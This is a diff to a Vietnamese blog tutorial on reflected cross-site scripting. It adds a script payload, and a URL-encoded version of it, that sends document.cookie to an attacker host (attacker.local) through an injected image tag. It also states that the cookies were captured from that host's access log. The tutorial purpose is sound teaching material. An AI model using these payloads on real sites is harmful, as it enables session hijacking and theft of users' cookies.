@@ -220,9 +220,15 @@ Giả sử ta có đoạn code sau:
 http://site1.local/tut4/index.php?name=toan
 ```
 Kế quả sẽ trả lại là 
+
 ![URL get]( {{site.url}}/assets/img/2021/05/17/210517_url_get.JPG){:width="500px"}
 
 + Tuy nhiên cải biên một chút ta lại truyền vào như sau:
+
+Payload: ```<script>document.write('<img src="http://site1.local/index.php?c='%2bdocument.cookie%2b'" />');</script>
+```
+URL:
+
 ```
 http://site1.local/tut4/index.php?name=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22http://attacker.local/index.php?c=%27%2bdocument.cookie%2b%27%22%20/%3E%27);%3C/script%3E
 ```
@@ -234,5 +240,6 @@ Nhưng khi soi log access của trang attacker.local (URL mà ta truyền vào p
 
 ![URL get3]( {{site.url}}/assets/img/2021/05/17/210517_url_get3.JPG){:width="500px"}
 
-Rõ ràng là ta đã lấy được toàn bộ dữ liệu cookie của trang web. 
+Bằng việc khai thác xss đã lấy được toàn bộ dữ liệu cookie của trang web. 
+
 
